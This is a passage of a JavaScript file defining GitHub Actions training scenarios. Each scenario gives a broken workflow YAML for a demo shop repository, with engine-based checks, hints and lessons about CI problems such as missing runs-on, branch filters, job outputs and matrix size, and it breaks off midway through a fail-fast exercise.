// Playground scenarios: each one is a small repository with a broken workflow.
// The learner edits the files, sends events, and the checks say when it is
// fixed. Each check runs the workflow on the engine; no check reads the YAML
// as text except where the goal is about how it is written (a pinned SHA).
"use strict";

(function (root) {
  const { trigger, newStore, trustAllows, toStr } = root.AQEngine;
  const { parse } = root.AQYaml;

  // Template text, without the indentation it has in this file.
  function y(strings, ...values) {
    const text = String.raw({ raw: strings.raw.map((s) => s.replace(/\\\$/g, "$")) }, ...values).replace(/^\n/, "").replace(/\s+$/, "\n");
    const pad = Math.min(...text.split("\n").filter((l) => l.trim()).map((l) => /^ */.exec(l)[0].length));
    return text.split("\n").map((l) => l.slice(pad)).join("\n");
  }

  const CI = ".github/workflows/ci.yml";
  const DEPLOY = ".github/workflows/deploy.yml";
  const REPO_FILES = {
    "package.json": '{\n  "name": "shop",\n  "version": "1.4.0",\n  "scripts": { "test": "jest", "build": "vite build", "start": "node server.js", "e2e": "playwright test" }\n}\n',
    "package-lock.json": '{\n  "name": "shop",\n  "version": "1.4.0",\n  "lockfileVersion": 3\n}\n',
    "src/cart.js": "export const total = (items) => items.reduce((n, i) => n + i.price, 0);\n",
    "src/login.js": "export function login(user) { return Boolean(user); }\n",
    "server.js": "require('http').createServer(app).listen(3000);\n",
    Dockerfile: "FROM node:24-alpine\nWORKDIR /app\nCOPY . .\nRUN npm ci && npm run build\nCMD [\"node\", \"server.js\"]\n",
    "deploy.sh": "#!/usr/bin/env bash\n# Ships the current build to the environment named in $1.\n",
    "scripts/upload-coverage.sh": "#!/usr/bin/env bash\n# Sends coverage/lcov.info to the coverage service with $COVERAGE_TOKEN.\n",
    "docs/setup.md": "# Setting up the shop\n",
    "README.md": "# shop\n"
  };
  // Every scenario starts from this world and changes what it needs.
  function baseWorld() {
    return { repo: { visibility: "public", defaultBranch: "main", permissive: false, files: { ...REPO_FILES } }, secrets: {}, vars: {}, environments: {}, app: {}, diskGB: 20, events: {} };
  }

  // --- helpers for checks ------------------------------------------------------------
  const ok = (r) => !!r && r.conclusion === "success";
  const jobsOf = (r, id) => (r ? r.jobs.filter((j) => j.id === id) : []);
  const ran = (r, id) => jobsOf(r, id).some((j) => j.conclusion && j.conclusion !== "skipped");
  const steps = (r) => (r ? r.jobs.flatMap((j) => j.steps) : []);
  const text = (r) => steps(r).flatMap((s) => s.lines.map((l) => l[0])).join("\n");
  const stepRan = (r, re) => steps(r).some((s) => re.test(s.name) && s.conclusion !== "skipped");
  const deployedTo = (r, env) => !!r && r.effects.deployed.some((d) => d.env === env);
  const writes = (j) => Object.entries(j.perms || {}).filter(([, v]) => v === "write").map(([k]) => k);
  const doc = (v, file) => { const p = parse(v.files[file] || ""); return p.value || {}; };
  const jobDef = (v, id, file = CI) => { const d = doc(v, file); return d && d.jobs && typeof d.jobs === "object" ? d.jobs[id] || {} : {}; };
  const stepsDef = (v, id, file = CI) => { const s = jobDef(v, id, file).steps; return Array.isArray(s) ? s.filter((x) => x && typeof x === "object") : []; };
  const noCoe = (v, id) => !stepsDef(v, id).some((s) => s["continue-on-error"] != null && toStr(s["continue-on-error"]) !== "false") && jobDef(v, id)["continue-on-error"] == null;
  const valid = (r) => !!r && r.status !== "invalid";

  const checkout = "actions/checkout@v6";
  const deployToken = { DEPLOY_TOKEN: "dpl-7c1e93a4f2b8" };

  const SCENARIOS = [
    // --- Basics ------------------------------------------------------------------
    {
      id: "runs-on", group: "Basics", level: "01", title: "Required property is missing: runs-on",
      story: "Your first workflow is committed, but the Actions tab shows a red cross before any job starts.",
      goal: "Run the tests on a GitHub-hosted Ubuntu runner on every push.",
      files: { [CI]: y`
        name: CI
        on: push
        jobs:
          test:
            steps:
              - uses: ${checkout}
              - run: npm ci
              - run: npm test
      ` },
      events: ["push"], verify: ["push"],
      checks: [
        ["The workflow file is valid", (v) => valid(v.run(0))],
        ["A push runs the tests and they pass", (v) => ok(v.run(0)) && stepRan(v.run(0), /npm test/)],
        ["The job runs on a GitHub-hosted Ubuntu runner", (v) => jobsOf(v.run(0), "test").every((j) => /^ubuntu-/.test(j.runsOn || ""))]
      ],
      hints: [
        "Run it and read the error: it names the line and the property that is missing.",
        "Every job needs to say which machine it runs on, with `runs-on:` at the same level as `steps:`.",
        "Add `runs-on: ubuntu-latest` under `test:`, indented like `steps:`."
      ],
      lesson: "A job needs runs-on: GitHub validates the whole file before it starts anything, and points at the line it cannot accept."
    },
    {
      id: "indent", group: "Basics", level: "01", title: "You have an error in your yaml syntax",
      story: "Someone added Node.js 22 to the workflow. Now no run starts and GitHub says the YAML is broken.",
      goal: "Set up Node.js 22 and run the tests.",
      files: { [CI]: y`
        name: CI
        on: push
        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - uses: ${checkout}
              - uses: actions/setup-node@v6
              with:
                node-version: 22
              - run: npm ci
              - run: npm test
      ` },
      events: ["push"], verify: ["push"],
      checks: [
        ["The workflow file is valid", (v) => valid(v.run(0))],
        ["Node.js 22 is set up", (v) => /node: v22\./.test(text(v.run(0)))],
        ["The tests pass", (v) => ok(v.run(0)) && stepRan(v.run(0), /npm test/)]
      ],
      hints: [
        "The error names a line. Look at how far it is indented compared with the step above it.",
        "`with:` belongs to the setup-node step, so it must be indented under `uses:`, not at the level of the `-`.",
        "Indent `with:` two more spaces so it lines up with `uses:`, and `node-version: 22` two more than that."
      ],
      lesson: "In YAML the indentation is the structure. A key belongs to the item whose keys it lines up with."
    },
    {
      id: "action-typo", group: "Basics", level: "01", title: "Unable to resolve action",
      story: "The build fails in under a second, in a step called Set up job, before any of your commands run.",
      goal: "Check out the code and run the tests.",
      files: { [CI]: y`
        name: CI
        on: push
        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - uses: actions/chekout@v6
              - run: npm ci
              - run: npm test
      ` },
      events: ["push"], verify: ["push"],
      checks: [
        ["Every action resolves", (v) => !/Unable to resolve action/.test(text(v.run(0)))],
        ["The code is checked out and the tests pass", (v) => ok(v.run(0)) && /Syncing repository/.test(text(v.run(0)))]
      ],
      hints: [
        "Open the Set up job step. The runner downloads every action before the first step runs.",
        "`repository not found` means the owner/name part is wrong; `unable to find version` means the part after @ is.",
        "The action is `actions/checkout`. Fix the spelling and keep `@v6`."
      ],
      lesson: "Actions are downloaded in Set up job, so a misspelt name or a version that does not exist fails the job before any step."
    },
    {
      id: "exit-code", group: "Basics", level: "02", title: "Process completed with exit code 1",
      story: "The team removed the last TODO from the cart code. Now the TODO report step fails every build.",
      goal: "Keep the TODO report, which should print 0 and pass, without hiding real failures.",
      files: { [CI]: y`
        name: CI
        on: push
        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - uses: ${checkout}
              - run: npm ci
              - name: TODO report
                run: grep -c TODO src/cart.js
              - run: npm test
      ` },
      events: ["push"], verify: ["push"],
      checks: [
        ["The run passes", (v) => ok(v.run(0))],
        ["The TODO report still runs and prints the count", (v) => steps(v.run(0)).some((s) => /TODO report/.test(s.name) && s.conclusion === "success" && s.lines.some((l) => l[0] === "0"))],
        ["No step uses continue-on-error", (v) => noCoe(v, "test")],
        ["The tests still run", (v) => stepRan(v.run(0), /npm test/)]
      ],
      hints: [
        "Open the TODO report step: grep printed 0, then the step failed. Which exit code does grep use when it finds nothing?",
        "Run steps use `bash -e`: any command that exits non-zero stops the step. grep exits 1 when nothing matches.",
        "Accept grep's 1 in that one place: `grep -c TODO src/cart.js || true`."
      ],
      lesson: "A step fails on the first non-zero exit code. Handle the codes a command uses for normal results (grep's 1) where you call it."
    },
    {
      id: "hidden-failure", group: "Basics", level: "02", title: "continue-on-error hides a failing test",
      story: "Customers report a wrong discount in the cart. The pipeline was green, and it deployed.",
      goal: "A failing test must fail the run and stop the deploy.",
      files: { [CI]: y`
        name: CI
        on:
          push:
            branches: [main]
        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - uses: ${checkout}
              - run: npm ci
              - name: Run tests
                run: npm test
                continue-on-error: true
          deploy:
            needs: test
            runs-on: ubuntu-latest
            steps:
              - uses: ${checkout}
              - run: ./deploy.sh production
                env:
                  DEPLOY_TOKEN: \${{ secrets.DEPLOY_TOKEN }}
      ` },
      world: { secrets: deployToken, app: { testsFail: true } },
      events: ["push"], verify: ["push"],
      checks: [
        ["The tests still run", (v) => stepRan(v.run(0), /tests|npm test/i)],
        ["The run fails when a test fails", (v) => v.run(0).conclusion === "failure"],
        ["Nothing reaches production", (v) => !deployedTo(v.run(0), "production")]
      ],
      hints: [
        "Open Run tests: it failed, yet the job is green. Look at that step's settings in the file.",
        "`continue-on-error: true` turns a failed step into success for the job, so deploy, which needs test, runs.",
        "Delete the `continue-on-error: true` line from the Run tests step."
      ],
      lesson: "continue-on-error makes a failure count as success. Use it only for steps whose failure truly does not matter."
    },
    {
      id: "env-steps", group: "Basics", level: "02", title: "A variable set in one step is empty in the next",
      story: "The build step works out the image tag and exports it. The push step then pushes an image called shop: with no tag.",
      goal: "Pass the tag from the first step to the second.",
      files: { [CI]: y`
        name: Image
        on: push
        jobs:
          image:
            runs-on: ubuntu-latest
            steps:
              - uses: ${checkout}
              - name: Work out the tag
                run: export IMAGE_TAG="1.4.\${{ github.run_number }}"
              - name: Check the tag
                run: |
                  echo "Tag: $IMAGE_TAG"
                  test -n "$IMAGE_TAG"
      ` },
      events: ["push"], verify: ["push"],
      checks: [
        ["The second step sees the tag", (v) => /Tag: 1\.4\.\d+/.test(text(v.run(0)))],
        ["The run passes", (v) => ok(v.run(0))]
      ],
      hints: [
        "Each run step is a new shell process. What does `export` do when that process ends?",
        "Steps share environment variables through a file the runner reads after each step: $GITHUB_ENV.",
        'Write it there: `echo "IMAGE_TAG=1.4.${{ github.run_number }}" >> "$GITHUB_ENV"`.'
      ],
      lesson: "Every step runs in its own shell. Write NAME=value to $GITHUB_ENV for later steps, or to $GITHUB_OUTPUT for an output."
    },
    {
      id: "fetch-depth", group: "Basics", level: "02", title: "fatal: No names found, cannot describe anything",
      story: "The version step uses git describe. It works on every laptop, and fails on every run.",
      goal: "Print the version from the latest tag and pass.",
      files: { [CI]: y`
        name: Version
        on: push
        jobs:
          version:
            runs-on: ubuntu-latest
            steps:
              - uses: ${checkout}
              - name: Version
                run: |
                  version=$(git describe --tags)
                  echo "Version $version"
      ` },
      events: ["push"], verify: ["push"],
      checks: [["git describe finds the tag", (v) => /Version v1\.3\.0-/.test(text(v.run(0)))], ["The run passes", (v) => ok(v.run(0))]],
      hints: [
        "Your laptop has the whole history. How much does actions/checkout fetch by default?",
        "checkout fetches one commit, with no tags, unless you ask for more with `fetch-depth`.",
        "Add `with:` and `fetch-depth: 0` to the checkout step, to fetch all history and tags."
      ],
      lesson: "actions/checkout makes a shallow clone of one commit. Tools that need history or tags need fetch-depth: 0."
    },
    {
      id: "set-output", group: "Basics", level: "03", title: "The set-output command is deprecated",
      story: "An old workflow still passes, but every run carries a yellow warning about set-output.",
      goal: "Pass the version between steps without the warning.",
      files: { [CI]: y`
        name: Release notes
        on: push
        jobs:
          notes:
            runs-on: ubuntu-latest
            steps:
              - id: version
                run: echo "::set-output name=value::1.4.0"
              - run: echo "Releasing \${{ steps.version.outputs.value }}"
      ` },
      events: ["push"], verify: ["push"],
      checks: [
        ["The second step prints 1.4.0", (v) => /Releasing 1\.4\.0/.test(text(v.run(0)))],
        ["No deprecation warning", (v) => !v.run(0).annotations.some((a) => /set-output/.test(a[1]))]
      ],
      hints: [
        "Read the warning: it names the replacement.",
        "Outputs are now written to the file whose path is in $GITHUB_OUTPUT, as name=value.",
        'Use `echo "value=1.4.0" >> "$GITHUB_OUTPUT"` and keep the step id.'
      ],
      lesson: "Workflow commands for outputs and state moved to environment files: $GITHUB_OUTPUT, $GITHUB_ENV, $GITHUB_STATE."
    },
    {
      id: "node20", group: "Basics", level: "09", title: "Node.js 20 actions are deprecated",
      story: "Every run shows a long warning about Node.js 20. The platform team says runners will stop shipping it.",
      goal: "Use action versions that run on Node.js 24, with the run still passing.",
      files: { [CI]: y`
        name: CI
        on: push
        jobs:
          build:
            runs-on: ubuntu-latest
            steps:
              - uses: actions/checkout@v4
              - uses: actions/setup-node@v4
                with:
                  node-version: 22
              - run: npm ci
              - run: npm run build
              - uses: actions/upload-artifact@v4
                with:
                  name: site
                  path: dist/
      ` },
      events: ["push"], verify: ["push"],
      checks: [
        ["No Node.js 20 deprecation warning", (v) => !v.run(0).annotations.some((a) => /Node\.js 20 actions are deprecated/.test(a[1]))],
        ["The build passes and uploads the site", (v) => ok(v.run(0)) && /successfully uploaded/.test(text(v.run(0)))]
      ],
      hints: [
        "The warning lists each action still on Node.js 20. Which three are they?",
        "Each action's major version declares its runtime: checkout v5 and later, setup-node v5 and later, and upload-artifact v6 and later run on Node.js 24.",
        "Change them to `actions/checkout@v6`, `actions/setup-node@v6` and `actions/upload-artifact@v6`."
      ],
      lesson: "Actions declare the Node.js they run on. Read the release notes, move to the major that runs on Node.js 24, and let Dependabot keep them current."
    },

    {
      id: "lfs", group: "Basics", level: "02", title: "Tests read a Git LFS pointer, not the file",
      story: "The price list moved to Git LFS. Locally everything passes; in CI the price test reads a three-line file starting with version https://git-lfs.github.com/spec/v1.",
      goal: "Check out the real price list and pass the price check.",
      files: { [CI]: y`
        name: CI
        on: push
        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - uses: ${checkout}
              - name: Price list is real data
                run: |
                  head -1 data/prices.csv
                  grep -q "^sku,price" data/prices.csv
              - run: npm ci
              - run: npm test
      ` },
      world: { repo: { files: { "data/prices.csv": "version https://git-lfs.github.com/spec/v1\noid sha256:4d7a214614ab2935c943f9e0ff69d22eadbb8f32b1258daaa5e2ca24d17e2393\nsize 18432\n" } },
        lfs: { "data/prices.csv": "sku,price\nA-100,12.50\nA-101,8.00\n" } },
      events: ["push"], verify: ["push"],
      checks: [["The price check reads real data", (v) => /^sku,price$/m.test(text(v.run(0)))], ["The run passes", (v) => ok(v.run(0))]],
      hints: [
        "Read what `head -1` printed. Is that a CSV header?",
        "actions/checkout does not download Git LFS objects unless you ask; you get the small pointer files instead.",
        "Add `with:` and `lfs: true` to the checkout step."
      ],
      lesson: "LFS files are pointers until fetched. Set lfs: true on checkout, and cache .git/lfs if the files are large."
    },
    // --- Triggers and conditions -----------------------------------------------------
    {
      id: "branch-filter", group: "Triggers and conditions", level: "02", title: "The workflow never runs",
      story: "CI was copied from an older project. Pushes to main merge happily, and the Actions tab stays empty.",
      goal: "Run CI on pushes to main, and only to main.",
      files: { [CI]: y`
        name: CI
        on:
          push:
            branches: [master]
        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - uses: ${checkout}
              - run: npm ci
              - run: npm test
      ` },
      events: ["push", "push-branch"], verify: ["push", "push-branch"],
      checks: [
        ["A push to main runs CI", (v) => ok(v.run(0))],
        ["A push to a feature branch does not", (v) => v.run(1).status === "not-triggered"]
      ],
      hints: [
        "Push to main and read why nothing ran.",
        "The branches filter is matched against the branch name. This repository's default branch is main.",
        "Change it to `branches: [main]`."
      ],
      lesson: "Branch filters must name branches that exist. A filter that matches nothing makes a workflow silently never run."
    },
    {
      id: "path-filter", group: "Triggers and conditions", level: "02", title: "Paths filter skips the code that changed",
      story: "The app moved from src/ to app/. Since then, code changes no longer run CI, and a bug got merged.",
      goal: "Run CI when code in app/ changes, but not for docs-only changes.",
      files: { [CI]: y`
        name: CI
        on:
          push:
            branches: [main]
            paths:
              - "src/**"
              - package-lock.json
        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - uses: ${checkout}
              - run: npm ci
              - run: npm test
      ` },
      world: { events: { push: { changed: ["app/cart.js"], message: "Fix the cart total" } } },
      events: ["push", "push-docs"], verify: ["push", "push-docs"],
      checks: [
        ["A change in app/ runs CI", (v) => ok(v.run(0))],
        ["A docs-only change does not", (v) => v.run(1).status === "not-triggered"]
      ],
      hints: [
        "Push and read why it did not run: which file changed, and what does `paths` list?",
        "`paths` lists the files that should start the workflow. src/ is gone; the code is in app/ now.",
        'Replace `"src/**"` with `"app/**"`.'
      ],
      lesson: "paths filters start a workflow only when a changed file matches. Keep them in step with the repository layout."
    },
    {
      id: "wrong-event", group: "Triggers and conditions", level: "03", title: "Deploy runs on pull requests",
      story: "A pull request from a feature branch just deployed its unreviewed code to production.",
      goal: "Run tests on pull requests and pushes, but deploy only on a push to main.",
      files: { [CI]: y`
        name: CI
        on:
          push:
            branches: [main]
          pull_request:
        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - uses: ${checkout}
              - run: npm ci
              - run: npm test
          deploy:
            needs: test
            runs-on: ubuntu-latest
            steps:
              - uses: ${checkout}
              - run: ./deploy.sh production
                env:
                  DEPLOY_TOKEN: \${{ secrets.DEPLOY_TOKEN }}
      ` },
      world: { secrets: deployToken },
      events: ["pr", "push"], verify: ["pr", "push"],
      checks: [
        ["A pull request runs the tests", (v) => ran(v.run(0), "test") && ok(v.run(0))],
        ["A pull request does not deploy", (v) => !deployedTo(v.run(0), "production")],
        ["A push to main deploys", (v) => deployedTo(v.run(1), "production")]
      ],
      hints: [
        "Send the pull request event. Which jobs run?",
        "A job runs for every event that starts the workflow unless its `if:` says otherwise. `github.event_name` and `github.ref` tell you which.",
        "Add `if: github.event_name == 'push' && github.ref == 'refs/heads/main'` to the deploy job."
      ],
      lesson: "Triggers start the workflow; if: decides each job. github.ref is the full ref, refs/heads/main, not main."
    },
    {
      id: "schedule", group: "Triggers and conditions", level: "02", title: "The nightly job never runs",
      story: "The nightly end-to-end job worked when you ran it by hand on develop. It has not run once at night.",
      goal: "Run the nightly job from the schedule.",
      files: { [CI]: y`
        name: Nightly
        on:
          schedule:
            - cron: "30 2 * * *"
          workflow_dispatch:
        jobs:
          e2e:
            if: github.ref == 'refs/heads/develop'
            runs-on: ubuntu-latest
            steps:
              - uses: ${checkout}
              - run: npm ci
              - run: npm run build
      ` },
      world: { events: { dispatch: { ref: "refs/heads/develop", label: "Run workflow on develop" } } },
      events: ["schedule", "dispatch"], verify: ["schedule"],
      checks: [["The schedule runs the job", (v) => ran(v.run(0), "e2e") && ok(v.run(0))]],
      hints: [
        "Fire the schedule and read why the job was skipped.",
        "Scheduled runs always use the latest commit on the default branch, so github.ref is refs/heads/main.",
        "Remove the `if:` line, or change it to allow main: `if: github.ref == 'refs/heads/main'`."
      ],
      lesson: "Schedules run on the default branch only, and GitHub turns them off after 60 days without activity in a public repository."
    },
    {
      id: "dispatch-input", group: "Triggers and conditions", level: "03", title: "workflow_dispatch input is empty",
      story: "The manual deploy button asks where to deploy. Whatever you pick, the deploy script says no environment was given.",
      goal: "Deploy to the environment chosen in the form.",
      files: { [CI]: y`
        name: Deploy
        on:
          workflow_dispatch:
            inputs:
              environment:
                description: Where to deploy
                type: choice
                options: [staging, production]
                default: staging
        jobs:
          deploy:
            runs-on: ubuntu-latest
            steps:
              - uses: ${checkout}
              - run: ./deploy.sh \${{ inputs.enviroment }}
                env:
                  DEPLOY_TOKEN: \${{ secrets.DEPLOY_TOKEN }}
      ` },
      world: { secrets: deployToken },
      events: ["dispatch"], verify: [{ id: "dispatch", inputs: { environment: "staging" } }, { id: "dispatch", inputs: { environment: "production" } }],
      checks: [
        ["Choosing staging deploys to staging", (v) => deployedTo(v.run(0), "staging")],
        ["Choosing production deploys to production", (v) => deployedTo(v.run(1), "production")]
      ],
      hints: [
        "Open the deploy step: what does the command look like after the expression was filled in?",
        "An unknown property in an expression is not an error; it is empty. Compare the input's name with the expression.",
        "Spell it as declared: `${{ inputs.environment }}`."
      ],
      lesson: "Expressions return empty for names that do not exist, silently. Read the expanded command in the log."
    },
    {
      id: "tag-release", group: "Triggers and conditions", level: "03", title: "Pushing a tag does not release",
      story: "You pushed tag v1.4.0 to publish a release. Nothing happened.",
      goal: "A pushed v* tag creates a release; pushes to main do not.",
      files: { [CI]: y`
        name: Release
        on:
          push:
            branches: [main]
        permissions:
          contents: write
        jobs:
          release:
            if: startsWith(github.ref, 'refs/tags/v')
            runs-on: ubuntu-latest
            steps:
              - uses: ${checkout}
              - run: gh release create "$GITHUB_REF_NAME" --generate-notes
                env:
                  GH_TOKEN: \${{ github.token }}
      ` },
      events: ["push-tag", "push"], verify: ["push-tag", "push"],
      checks: [
        ["Tag v1.4.0 creates a release", (v) => ok(v.run(0)) && !!v.run(0).effects.released],
        ["A push to main does not", (v) => !(v.run(1).effects || {}).released]
      ],
      hints: [
        "Push the tag and read why the workflow did not start.",
        "A push trigger with only `branches:` ignores tags. Tags need their own filter.",
        "Add `tags: ['v*']` under `push:`, next to `branches:`."
      ],
      lesson: "With a branches filter and no tags filter, tag pushes do not start the workflow. List both when you need both."
    },

    {
      id: "required-check", group: "Triggers and conditions", level: "02", title: "Required check stuck at Expected",
      story: "A docs-only pull request cannot be merged. The merge box says the required check test is Expected, waiting for status to be reported, and it never changes.",
      goal: "Docs-only pull requests can merge, and code changes still run the tests.",
      files: { [CI]: y`
        name: CI
        on:
          pull_request:
            paths:
              - "src/**"
              - package-lock.json
        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - uses: ${checkout}
              - run: npm ci
              - run: npm test
      ` },
      world: { requiredChecks: ["test"] },
      events: ["pr-docs", "pr"], verify: ["pr-docs", "pr"],
      checks: [
        ["A docs-only pull request reports the test check", (v) => (v.run(0).required || []).every((c) => c.state === "success")],
        ["A code pull request runs the tests", (v) => stepRan(v.run(1), /npm test/) && (v.run(1).required || []).every((c) => c.state === "success")]
      ],
      hints: [
        "Send the docs-only pull request. Did the workflow start at all?",
        "A workflow skipped by a paths filter reports nothing, so a required check waits forever. A job skipped by `if:` reports success.",
        "Remove the `paths:` filter. To still save minutes, skip the expensive steps inside the job instead of skipping the workflow."
      ],
      lesson: "Never put paths filters on workflows that provide required checks. Skip work inside the job, where a skipped job still reports."
    },
    {
      id: "merge-queue", group: "Triggers and conditions", level: "02", title: "Merge queue waits for a check that never runs",
      story: "The repository turned on the merge queue. Approved pull requests enter the queue, wait, and are removed without merging.",
      goal: "The merge queue gets the required test check, and pull requests still run it.",
      files: { [CI]: y`
        name: CI
        on:
          pull_request:
          push:
            branches: [main]
        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - uses: ${checkout}
              - run: npm ci
              - run: npm test
      ` },
      world: { requiredChecks: ["test"] },
      events: ["merge-queue", "pr"], verify: ["merge-queue", "pr"],
      checks: [
        ["The merge queue gets the test check", (v) => (v.run(0).required || []).every((c) => c.state === "success")],
        ["Pull requests still run the tests", (v) => ok(v.run(1))]
      ],
      hints: [
        "Send the merge queue event. Which event does the queue send?",
        "The merge queue creates a temporary branch and sends a `merge_group` event. Workflows must listen for it to report checks there.",
        "Add `merge_group:` under `on:`."
      ],
      lesson: "With a merge queue, every workflow that provides a required check needs the merge_group trigger."
    },
    {
      id: "token-no-trigger", group: "Triggers and conditions", level: "07", title: "A tag pushed by the workflow starts nothing",
      story: "Release tags itself after each merge to main. The deploy workflow listens for v* tags, yet it has never run for one of those tags.",
      goal: "A merge to main ends with production deployed by the tag's own workflow run.",
      files: {
        ".github/workflows/release.yml": y`
          name: Release
          on:
            push:
              branches: [main]
          permissions:
            contents: write
          jobs:
            tag:
              runs-on: ubuntu-latest
              steps:
                - uses: ${checkout}
                - name: Tag the release
                  run: |
                    git tag "v1.4.\${{ github.run_number }}"
                    git push origin "v1.4.\${{ github.run_number }}"
        `,
        ".github/workflows/deploy.yml": y`
          name: Deploy release
          on:
            push:
              tags: ['v*']
          jobs:
            deploy:
              runs-on: ubuntu-latest
              steps:
                - uses: ${checkout}
                - run: ./deploy.sh production
                  env:
                    DEPLOY_TOKEN: \${{ secrets.DEPLOY_TOKEN }}
        `
      },
      world: { workflow: ".github/workflows/release.yml", secrets: { ...deployToken, RELEASE_APP_TOKEN: "app-token-5f1c9a" } },
      events: ["push"], verify: ["push"],
      checks: [
        ["The tag is pushed", (v) => v.runs[0][0].effects.pushedTags.length > 0],
        ["Production is deployed from a v* tag run", (v) => v.runs[0].some((r) => /^refs\/tags\/v/.test(r.event.ref) && r.effects.deployed.some((d) => d.env === "production"))]
      ],
      hints: [
        "The tag reaches GitHub; check the Actions tab for a deploy run. Which token pushed it?",
        "Events caused by the GITHUB_TOKEN do not start new workflow runs, so workflows cannot trigger each other in loops. A GitHub App token or a PAT does; so does workflow_dispatch.",
        "Check out with the release app's token: add `with:` and `token: ${{ secrets.RELEASE_APP_TOKEN }}` to the checkout step in release.yml."
      ],
      lesson: "Pushes, tags and releases made with the GITHUB_TOKEN start no workflows. Use an App token, call the next workflow directly, or dispatch it."
    },
    // --- Jobs and matrices ------------------------------------------------------------
    {
      id: "needs-order", group: "Jobs and matrices", level: "03", title: "Deploy does not wait for the tests",
      story: "A failing test went to production: deploy waited for the build, but never for the test result.",
      goal: "Deploy only after both test and build succeed.",
      files: { [CI]: y`
        name: CI
        on:
          push:
            branches: [main]
        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - uses: ${checkout}
              - run: npm ci
              - run: npm test
          build:
            runs-on: ubuntu-latest
            steps:
              - uses: ${checkout}
              - run: npm ci
              - run: npm run build
          deploy:
            needs: build
            runs-on: ubuntu-latest
            steps:
              - uses: ${checkout}
              - run: ./deploy.sh production
                env:
                  DEPLOY_TOKEN: \${{ secrets.DEPLOY_TOKEN }}
      ` },
      world: { secrets: deployToken, app: { testsFail: true, buildSecs: 120 } },
      events: ["push"], verify: ["push"],
      checks: [
        ["Deploy starts after test and build finish", (v) => jobsOf(v.run(0), "deploy").every((d) => [...jobsOf(v.run(0), "test"), ...jobsOf(v.run(0), "build")].every((t) => d.start >= t.end))],
        ["A failing test stops the deploy", (v) => !deployedTo(v.run(0), "production") && ran(v.run(0), "test")]
      ],
      hints: [
        "Look at the job graph: which jobs start at the same time?",
        "Jobs run in parallel unless `needs:` says otherwise, and `needs:` can list several jobs.",
        "Make deploy need both: `needs: [test, build]`."
      ],
      lesson: "needs sets the order and the gate: a job runs only when every job it needs succeeded."
    },
    {
      id: "job-outputs", group: "Jobs and matrices", level: "04", title: "needs.<job>.outputs is empty",
      story: "The build job computes the image name. The deploy job prints an empty image name and stops.",
      goal: "Pass the image name from build to deploy.",
      files: { [CI]: y`
        name: CI
        on: push
        jobs:
          build:
            runs-on: ubuntu-latest
            steps:
              - id: meta
                run: echo "image=ghcr.io/nimbus/shop:1.4.\${{ github.run_number }}" >> "$GITHUB_OUTPUT"
          deploy:
            needs: build
            runs-on: ubuntu-latest
            steps:
              - uses: ${checkout}
              - name: Deploy
                run: |
                  echo "Deploying image: \${{ needs.build.outputs.image }}"
                  test -n "\${{ needs.build.outputs.image }}"
                  ./deploy.sh production
                env:
                  DEPLOY_TOKEN: \${{ secrets.DEPLOY_TOKEN }}
      ` },
      world: { secrets: deployToken },
      events: ["push"], verify: ["push"],
      checks: [
        ["Deploy prints the image name", (v) => /Deploying image: ghcr\.io\/nimbus\/shop:1\.4\.\d+/.test(text(v.run(0)))],
        ["Production is deployed", (v) => deployedTo(v.run(0), "production")]
      ],
      hints: [
        "The step writes an output, so steps.meta.outputs.image exists inside build. What does build expose to other jobs?",
        "Other jobs see only what a job declares under `outputs:` at the job level.",
        "Add to the build job: `outputs:` then `image: ${{ steps.meta.outputs.image }}`."
      ],
      lesson: "Step outputs stay inside their job. Declare job outputs to pass values through needs."
    },
    {
      id: "matrix-size", group: "Jobs and matrices", level: "04", title: "The matrix makes 60 jobs",
      story: "Each push queues 60 jobs, most of them on Windows and macOS. Pull requests wait half an hour for a runner.",
      goal: "Test every Node.js version on Linux and each OS once, in 8 jobs or fewer.",
      files: { [CI]: y`
        name: CI
        on: push
        jobs:
          test:
            runs-on: \${{ matrix.os }}
            strategy:
              matrix:
                os: [ubuntu-latest, windows-latest, macos-latest]
                node: [18, 20, 22, 24]
                tz: [UTC, America/New_York, Asia/Kolkata, Europe/Berlin, Australia/Sydney]
            steps:
              - uses: ${checkout}
              - uses: actions/setup-node@v6
                with:
                  node-version: \${{ matrix.node }}
              - run: npm ci
              - run: npm test
      ` },
      world: { app: { testSecs: 50 } },
      events: ["push"], verify: ["push"],
      checks: [
        ["8 jobs or fewer", (v) => v.run(0).jobs.length <= 8 && v.run(0).jobs.length > 0],
        ["Node.js 18, 20, 22 and 24 run on Linux", (v) => [18, 20, 22, 24].every((n) => v.run(0).jobs.some((j) => j.os === "Linux" && j.conclusion === "success" && new RegExp(`\\b${n}\\b`).test(j.name)))],
        ["Windows and macOS each run once or more", (v) => ["Windows", "macOS"].every((os) => v.run(0).jobs.some((j) => j.os === os && j.conclusion === "success"))]
      ],
      hints: [
        "Count: 3 operating systems × 4 versions × 5 time zones. Which dimension adds nothing?",
        "Drop tz, and keep the full Node.js range on Linux only. `include:` adds single extra combinations.",
        "Use `os: [ubuntu-latest]`, `node: [18, 20, 22, 24]` and `include:` with `- os: windows-latest` / `node: 24` and `- os: macos-latest` / `node: 24`."
      ],
      lesson: "A matrix multiplies. Test the full range where it matters and add single combinations with include. On private repositories, Windows and macOS minutes cost two and ten times as much."
    },
    {
      id: "fail-fast", group: "Jobs and matrices", level: "04", title: "The operation was canceled",
      story: "Tests fail on Python 3.11. You fix it, push, and then 3.13 fails. Each run showed only one failure.",
      goal: "See the result of every Python version in one run.",
      files: { [CI]: y`
        name: CI
        on: push
        jobs:
          test:
            runs-on: ubuntu-latest
            strategy:
              matrix:
                python: ["3.11", "3.12", "3.13"]
            steps:
              - uses: ${checkout}
              - uses: actions/setup-python@v6
                with:
                  python-version: \${{ matrix.python }}
              - run: python -m pytest
      ` },
      world: { app: { failOn: ["3.11", "3.13"], pytestSecs: { "3.11": 20, "3.12": 45, "3.13": 70 } } },
      events: ["push"], verify: ["push"],
      checks: [
